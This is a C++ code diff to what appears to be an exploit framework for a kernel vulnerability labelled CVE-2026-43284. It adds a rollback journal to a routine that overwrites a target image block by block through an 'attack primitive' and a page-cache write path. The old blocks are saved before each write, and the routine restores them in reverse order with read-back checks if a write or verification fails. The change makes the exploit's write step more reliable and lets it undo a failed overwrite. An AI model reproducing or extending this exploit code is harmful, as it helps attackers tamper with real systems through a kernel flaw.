@@ -26,6 +26,8 @@ namespace ghostlock::backend::cve_2026_43284::steps {
     inline constexpr const char *kImageNotAligned = "step-width-zero";
     inline constexpr const char *kWriteRefused = "step-write-refused";
     inline constexpr const char *kVerifyFailed = "step-verify-failed";
+    /** 旧块读不到 ⇒ 这一块不能写：写了就回不去。fail-closed 的第三个名字。 */
+    inline constexpr const char *kJournalUnread = "step-journal-unread";
     inline constexpr const char *kNoAccess = "step-access-missing";
     inline constexpr const char *kPlanMissing = "step-plan-missing";
     inline constexpr const char *kBranchOutOfRange = "step-branch-out-of-range";
@@ -353,7 +355,77 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         return (block % verify_every) == 0U;
     }
 
-    bool write_image_verified(WriteRequest &request, const char **refusal) noexcept {
+    namespace {
+        /**
+         *  一次写的回滚日志视图。**只是视图**：存储是调用方的 request.journal，
+         *  这里记条目宽度、容量与已记条数，不分配、不持有、不新增全局状态。
+         *  entry_bytes = 一个块的宽度（镜像写是 16），capacity 按块数算，日志行按条数报。
+         */
+        struct JournalView final {
+            std::byte *base = nullptr;
+            std::size_t entry_bytes = 0U;
+            std::size_t capacity = 0U;
+            std::size_t count = 0U;
+            bool overflow = false;
+
+            /** 调用方给了存储且块宽可用 ⇒ 记日志（容量为 0 也算给了：第一块就记溢出）。 */
+            [[nodiscard]] bool active() const noexcept { return base != nullptr && entry_bytes != 0U; }
+        };
+
+        /** 一条记录旧块的地址（只在 count 以内调用）。 */
+        [[nodiscard]] std::byte *journal_entry(const JournalView &journal, std::size_t index) noexcept {
+            return journal.base + index * journal.entry_bytes;
+        }
+
+        /**
+         *  逆序回滚：journal 里最后记下的块先写回。参照实现 ghostlock-app-ref@5f184760
+         *  steps/chain.cpp:151-173 的 rollback_journal 就是这个次序；这里多一条判据 ——
+         *  **每块写后回读比较**，写不回或回读不符的块计入 rollback_incomplete，其余条目照旧回滚
+         *  （一块救不回来不能让剩下的块留在补丁里）。回滚只做一次尝试：它跑在失败路径上，
+         *  重试属于上层；页来源与攻击原语一字未动，写的还是同一个 access / channel / 宽度。
+         *  @param request 提供 access / params / channel 与段基址（宽度取自 journal 条目）
+         *  @param journal 调用方的日志视图（count 条会被逐条写回）
+         *  @param outcome 写入 blocks_rolled_back 与 rollback_incomplete
+         */
+        void rollback_journal(WriteRequest &request, const JournalView &journal,
+                              WriteOutcome &outcome) noexcept {
+            std::size_t rolled = 0U;
+            for (std::size_t i = journal.count; i > 0U; --i) {
+                const std::size_t block = i - 1U;
+                const std::uint64_t at =
+                        request.offset + static_cast<std::uint64_t>(block * journal.entry_bytes);
+                std::byte old_block[64] = {};
+                std::memcpy(old_block, journal_entry(journal, block), journal.entry_bytes);
+                request.params->offset = at;
+                request.params->offset_set = true;
+                const auto wrote = request.access->write(
+                        0U, std::span<const std::byte>(old_block, journal.entry_bytes),
+                        request.channel, *request.params);
+                bool restored = wrote.ok() && wrote.value == journal.entry_bytes;
+                if (restored) {
+                    const auto back = request.access->read(0U, journal.entry_bytes,
+                                                          request.channel, *request.params);
+                    restored = back.ok() && back.value.size() == journal.entry_bytes &&
+                               std::memcmp(back.value.data(), old_block, journal.entry_bytes) == 0;
+                }
+                if (restored) {
+                    ++rolled;
+                } else {
+                    outcome.rollback_incomplete = true;
+                }
+                GL_LOGI("rollback block[%zu]: off=%llu restored=%d rolled=%zu incomplete=%d",
+                        block, static_cast<unsigned long long>(at), restored ? 1 : 0, rolled,
+                        outcome.rollback_incomplete ? 1 : 0);
+            }
+            outcome.blocks_rolled_back = rolled;
+            GL_LOGI("rollback: from=%zu to=0 rolled=%zu incomplete=%d",
+                    journal.count == 0U ? 0U : journal.count - 1U, rolled,
+                    outcome.rollback_incomplete ? 1 : 0);
+        }
+    }  // namespace
+
+    bool write_image_verified(WriteRequest &request, const char **refusal,
+                              WriteOutcome *outcome_out) noexcept {
         if (request.access == nullptr || request.params == nullptr) {
             *refusal = kNoAccess;
             return false;
@@ -368,6 +440,28 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         }
         const std::size_t blocks = (request.image.size() + request.width - 1U) / request.width;
         request.failed_block = kNoFailedBlock;
+        /* 回滚日志的视图：存储与容量都是调用方给的（空 span ⇒ 不记也不回滚，行为与加日志之前
+         * 完全一致）。声明容量 0 表示「用满 span」，两者取小 —— 容量按块数算。 */
+        JournalView journal{};
+        if (!request.journal.empty()) {
+            std::size_t bytes = request.journal.size();
+            if (request.journal_capacity_bytes != 0U && request.journal_capacity_bytes < bytes) {
+                bytes = request.journal_capacity_bytes;
+            }
+            journal.base = request.journal.data();
+            journal.entry_bytes = request.width;
+            journal.capacity = bytes / request.width;
+        }
+        WriteOutcome ledger{};
+        /* 失败只有一个出口：先把已记的旧块逆序写回，再把这一块的失败记下来，最后把账交出去。 */
+        const auto fail = [&](const char *reason, std::size_t block) noexcept {
+            *refusal = reason;
+            request.failed_block = block;
+            rollback_journal(request, journal, ledger);
+            GL_LOGI("journal: n=%zu overflow=%d", journal.count, journal.overflow ? 1 : 0);
+            if (outcome_out != nullptr) { *outcome_out = ledger; }
+            return false;
+        };
         /* 上一次尝试没通过（重发过、或回读不符过）⇒ 下一块一定回读：这条通道此刻不可信，
          * 抽样不适用于它。只有真正做过一次尝试才会置位，所以「没抽样」不会污染它。 */
         bool after_failure = false;
@@ -389,6 +483,28 @@ namespace ghostlock::backend::cve_2026_43284::steps {
              *  同一块的来源 fd 由窗口层报（pagecache_write.hpp 的 write_block enter fd=…））。 */
             GL_LOGI("image block[%zu/%zu]: off=%llu len=%zu take=%zu",
                     block, blocks, static_cast<unsigned long long>(request.offset + at), request.width, take);
+            /* journal：**写之前**先把旧块记下来。走的就是本单元既有的回读路径（access->read，
+             * 与校验读同一个面、同一个宽度、同一份 offset 语义），不另开一条读法。
+             * 容量不足 ⇒ 只置溢出、继续写（与参照实现同：溢出只记录，不中止）。 */
+            if (journal.active()) {
+                if (journal.count < journal.capacity) {
+                    const auto old = request.access->read(0U, request.width, request.channel, *request.params);
+                    if (!old.ok() || old.value.size() != request.width) {
+                        /* 记不下旧块 ⇒ 这一块不能写：写了就回不去。已记的照旧回滚。 */
+                        static char journal_message[128] = {};
+                        std::snprintf(journal_message, sizeof(journal_message), "%s:%s", kJournalUnread,
+                                      ghostlock::contract::KernelAccess::status_name(old.status));
+                        return fail(journal_message, block);
+                    }
+                    std::memcpy(journal_entry(journal, journal.count), old.value.data(),
+                                journal.entry_bytes);
+                    ++journal.count;
+                } else {
+                    /* 溢出只记录、继续写（与参照实现同）：这一块不进 journal，回滚时也回不去它。 */
+                    journal.overflow = true;
+                    ledger.journal_overflow = true;
+                }
+            }
             const auto written = request.access->write(0U, std::span<const std::byte>(in, request.width),
                                                       request.channel, *request.params);
             if (!written.ok() || written.value != request.width) {
@@ -396,10 +512,9 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                 static char message[96] = {};
                 std::snprintf(message, sizeof(message), "step-write-refused:%s",
                               ghostlock::contract::KernelAccess::status_name(written.status));
-                *refusal = message;
-                request.failed_block = block;
-                return false;
+                return fail(message, block);
             }
+            ++ledger.written;
             if ((at % kLogEveryBytes) == 0U) {
                 GL_LOGI("block[%zu]: wrote=%zu/%zu offset=%llu budget_ms=%llu", at, written.value, request.width,
                         static_cast<unsigned long long>(request.offset + at),
@@ -453,6 +568,7 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                             ? static_cast<unsigned>(std::to_integer<std::uint8_t>(back.value[3])) : 0U);
                 }
                 if (matches) {
+                    ++ledger.verified;
                     /* How long did this block take, and how many tries? A block that never matches
                      * burns the whole budget, which is what turns a five second chain into minutes. */
                     const auto block_us = std::chrono::duration_cast<std::chrono::microseconds>(
@@ -491,14 +607,16 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                         ok ? static_cast<unsigned>(std::to_integer<std::uint8_t>(scan.value[0])) : 0U,
                         ok ? static_cast<unsigned>(std::to_integer<std::uint8_t>(scan.value[1])) : 0U);
             }
-            *refusal = kVerifyFailed;  /* budget-exhausted：预算用尽仍不中 */
+                    /* budget-exhausted：预算用尽仍不中 ⇒ 整段失败，已记的旧块逆序写回。 */
                     GL_LOGI("block[%zu]: budget exhausted after %zu tries", at, tries);
-                    request.failed_block = block;
-                    return false;
+                    return fail(kVerifyFailed, block);
                 }
                 ::usleep(2000);  /* 一个轮询间隔（2 ms） */
             }
         }
+        /* 成功路径的账：n 条旧块留在 journal 里，一条都没有写回（rolled_back 保持 0）。 */
+        GL_LOGI("journal: n=%zu overflow=%d", journal.count, journal.overflow ? 1 : 0);
+        if (outcome_out != nullptr) { *outcome_out = ledger; }
         return true;
     }
 }  // namespace ghostlock::backend::cve_2026_43284::steps
